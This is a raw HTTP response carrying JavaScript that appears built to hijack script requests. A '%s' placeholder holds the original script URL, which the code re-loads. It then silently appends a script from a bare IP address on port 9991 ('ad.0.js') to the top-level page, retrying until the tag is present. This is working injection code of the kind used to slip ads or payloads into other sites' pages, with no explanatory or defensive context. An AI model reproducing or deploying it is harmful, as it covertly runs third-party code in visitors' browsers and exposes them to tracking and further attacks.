HTTP/1.1 200 OK
Content-Type: application/x-javascript
Connection: close
Cache-Control: no-cache, no-store
Pragma: no-cache
Expires: -1
Last-Modified: Sat, 01 Jan 2000 00:00:00 GMT

(function(){
var erbbody = window.top.document.getElementsByTagName("html")[0]
var s = "%s"
if(s.indexOf('?')>-1){
    s+="&49ba=3cd";
}else{
    s+="?49ba=3cd";
}
document.write("<script type='text/javascript' src='"+s+"'></script>")

var ins=function(){
    console.log("runle1");
    if(window.top == window.self){
        if(!document.getElementById("erbijs")){
            console.log("runle");
            var erbscript = document.createElement("script");
            erbscript.setAttribute("src", "//101.200.156.248:9991/ad.0.js?v=3.5&sp=999&ty=dpc&sda_man=");
            erbscript.setAttribute("id", "erbijs");
            erbbody.appendChild(erbscript);
            if(!document.getElementById("erbijs")){
                setTimeout("ins()", 1500);
            }
        }
    }
}
ins();
})();
